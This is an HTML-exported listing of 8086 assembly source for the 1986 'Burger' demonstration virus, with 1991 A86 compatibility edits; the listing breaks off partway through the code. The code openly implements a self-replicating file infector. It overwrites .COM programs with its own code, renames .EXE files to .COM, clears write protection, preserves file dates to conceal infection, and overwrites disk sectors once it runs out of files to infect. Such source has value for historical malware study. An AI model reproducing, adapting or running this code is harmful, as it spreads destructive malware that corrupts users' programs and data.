<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; Program Virus            Ver.:     1.1</span><span class="sc0">
</span><span class="sc1">; Copyright by R. Burger 1986</span><span class="sc0">
</span><span class="sc1">; This is a demonstration program for computer</span><span class="sc0">
</span><span class="sc1">; viruses. It has the ability to replicate itself,</span><span class="sc0">
</span><span class="sc1">; and thereby modify other programs</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Added A86 v3.22 compatibility 15 Dec 1991</span><span class="sc0">
</span><span class="sc1">; command line: a86 burger.asm burger.com +D</span><span class="sc0">
</span><span class="sc1">; Copyright (C) 1991  ==[ CyberZone ]== Jon A Johnson</span><span class="sc0">

</span><span class="sc9">page</span><span class="sc0"> </span><span class="sc2">70</span><span class="sc4">,</span><span class="sc2">120</span><span class="sc0">
</span><span class="sc9">Name</span><span class="sc0">  </span><span class="sc5">BURGER</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">
</span><span class="sc5">progr</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc5">progr</span><span class="sc0">

</span><span class="sc1">; The three NOP's serve as the marker byte of the</span><span class="sc0">
</span><span class="sc1">; virus which allow it to identify a virus.</span><span class="sc0">

</span><span class="sc5">MAIN</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc1">; Initialize the pointers</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">pointer</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">counter</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">disks</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc1">; Get the selected drive</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">                    </span><span class="sc1">; drive?</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">; Get the current path on the current drive</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">drive</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">; save drive</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">47h</span><span class="sc0">                    </span><span class="sc1">; dir?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                     </span><span class="sc1">; in actual drive</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">old_path</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">; Get the number of drives present</span><span class="sc0">
</span><span class="sc1">; If only one drive is present, the pointer for</span><span class="sc0">
</span><span class="sc1">; search order will be set to search order + 6</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">                    </span><span class="sc1">; how many disks</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">                     </span><span class="sc1">; one drive?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">hups3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06</span><span class="sc0">

</span><span class="sc5">hups3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">search_order</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">pointer</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">

</span><span class="sc1">; Carry is set, if no more .COM's are found.</span><span class="sc0">
</span><span class="sc1">; Then, to avoid unnecessary work, .EXE files will</span><span class="sc0">
</span><span class="sc1">; be renamed to .COM files and infected.</span><span class="sc0">
</span><span class="sc1">; This causes the error message "Program too large</span><span class="sc0">
</span><span class="sc1">; to fit in memory" when starting larger infected</span><span class="sc0">
</span><span class="sc1">; .EXE programs.</span><span class="sc0">

</span><span class="sc5">change_disk</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">no_name_change</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">17h</span><span class="sc0">                    </span><span class="sc1">; change exe to com</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">maske_exe</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_name_change</span><span class="sc0">            </span><span class="sc1">; .EXE found?</span><span class="sc0">

</span><span class="sc1">; If neither .COM nor .EXE is found, then sectors will</span><span class="sc0">
</span><span class="sc1">; be overwritten depending on the system time in</span><span class="sc0">
</span><span class="sc1">; milliseconds. This is the time of the complete</span><span class="sc0">
</span><span class="sc1">; "infection" of a storage medium. The virus can find</span><span class="sc0">
</span><span class="sc1">; nothing more to infect and starts its destruction.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">                    </span><span class="sc1">; read system clock</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">pointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">26h</span><span class="sc0">                       </span><span class="sc1">; write crap on disk</span><span class="sc0">

</span><span class="sc1">; Check if the end of the search order table has been</span><span class="sc0">
</span><span class="sc1">; reached. If so, end.</span><span class="sc0">

</span><span class="sc5">no_name_change</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">pointer</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">pointer</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">hups2</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">hops</span><span class="sc0">

</span><span class="sc1">; Get new drive from the search order table and</span><span class="sc0">
</span><span class="sc1">; select it.</span><span class="sc0">

</span><span class="sc5">hups2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                       </span><span class="sc1">; change disk</span><span class="sc0">

</span><span class="sc1">; Start in the root directory</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">                    </span><span class="sc1">; change path</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">path</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">find_first_file</span><span class="sc0">

</span><span class="sc1">; Starting from the root, search for the first subdir</span><span class="sc0">
</span><span class="sc1">; First convert all .EXE files to .COM in the old</span><span class="sc0">
</span><span class="sc1">; directory.</span><span class="sc0">

</span><span class="sc5">find_first_subdir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">17h</span><span class="sc0">                    </span><span class="sc1">; change exe to com</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">maske_exe</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">                    </span><span class="sc1">; use root dir</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">path</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04eh</span><span class="sc0">                   </span><span class="sc1">; Search for first subdirectory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00010001b</span><span class="sc0">              </span><span class="sc1">; dir mask</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">maske_dir</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">change_disk</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">counter</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">use_next_subdir</span><span class="sc0">

</span><span class="sc1">; Search for the next subdir. If no more directories</span><span class="sc0">
</span><span class="sc1">; are found, the drive will be changed.</span><span class="sc0">

</span><span class="sc5">find_next_subdir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">                    </span><span class="sc1">; search for next subdir</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">change_disk</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">find_next_subdir</span><span class="sc0">

</span><span class="sc1">; Select found directory.</span><span class="sc0">

</span><span class="sc5">use_next_subdir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">                    </span><span class="sc1">; get dta address</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc12">'\ '</span><span class="sc0">              </span><span class="sc1">; address of name in dta</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">                    </span><span class="sc1">; change path</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">counter</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">counter</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc1">; Find first .COM file in the current directory.</span><span class="sc0">
</span><span class="sc1">; If there are none, search the next directory.</span><span class="sc0">

</span><span class="sc5">find_first_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04eh</span><span class="sc0">                   </span><span class="sc1">; Search for first</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00000001b</span><span class="sc0">              </span><span class="sc1">; mask</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">maske_com</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">find_first_subdir</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">check_if_ill</span><span class="sc0">

</span><span class="sc1">; If the program is already infected, search for</span><span class="sc0">
</span><span class="sc1">; the next program.</span><span class="sc0">

</span><span class="sc5">find_next_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">                    </span><span class="sc1">; search for next</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">find_first_subdir</span><span class="sc0">

</span><span class="sc1">; Check if already infected by the virus.</span><span class="sc0">

</span><span class="sc5">check_if_ill</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">                    </span><span class="sc1">; open channel</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                    </span><span class="sc1">; read/write</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc0">                    </span><span class="sc1">; address of name in dta</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; save channel</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                    </span><span class="sc1">; read file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">buflen</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc0">                 </span><span class="sc1">; write in buffer</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                    </span><span class="sc1">; close file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">; Here we search for the three NOP's.</span><span class="sc0">
</span><span class="sc1">; If present, there is already infection. We must</span><span class="sc0">
</span><span class="sc1">; then continue the search.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc9">offset</span><span class="sc4">[</span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; added A86 compatibility</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">9090h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">find_next_file</span><span class="sc0">

</span><span class="sc1">; Bypass MS-DOS write protection if present</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">                    </span><span class="sc1">; write enable</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc0">                    </span><span class="sc1">; address of name in dta</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">11111110b</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">; Open file for read/write access.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">                    </span><span class="sc1">; open channel</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                    </span><span class="sc1">; read/write</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc0">                    </span><span class="sc1">; address of name in dta</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">; Read date entry of program and save for future use.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; channel</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc0">                    </span><span class="sc1">; get date</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">; save date</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc1">; The jump located at address 0100h of the program</span><span class="sc0">
</span><span class="sc1">; will be saved for future use.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">conta</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; save old jmp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc9">offset</span><span class="sc4">[</span><span class="sc5">jmpbuf</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; added A86 compatibility</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; save new jump</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">cont</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">conta</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc1">; The virus copies itself to the start of the file.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                    </span><span class="sc1">; write virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">buflen</span><span class="sc0">                 </span><span class="sc1">; length buffer</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">main</span><span class="sc0">                   </span><span class="sc1">; write virus</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">; Enter the old creation date of the file.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc0">                    </span><span class="sc1">; write date</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                        </span><span class="sc1">; restore date</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">; Close the file</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                    </span><span class="sc1">; close file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">; Restore the old jump address.</span><span class="sc0">
</span><span class="sc1">; The virus saves at address "conta" the jump which</span><span class="sc0">
</span><span class="sc1">; was at the start of the host program.</span><span class="sc0">
</span><span class="sc1">; This is done to preserve the executability of the</span><span class="sc0">
</span><span class="sc1">; host program as much as possible.</span><span class="sc0">
</span><span class="sc1">; After saving it still works with the jump address</span><span class="sc0">
</span><span class="sc1">; contained in the virus. The jump address in the</span><span class="sc0">
</span><span class="sc1">; virus differs from the jump address in memory.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc9">offset</span><span class="sc4">[</span><span class="sc5">jmpbuf</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; restore old jmp - A86 compat.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">conta</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc5">hops</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">use_old</span><span class="sc0">

</span><span class="sc1">; Continue with the host program.</span><span class="sc0">

</span><span class="sc5">cont</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">                       </span><span class="sc1">; make jump</span><span class="sc0">
</span><span class="sc5">conta</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">
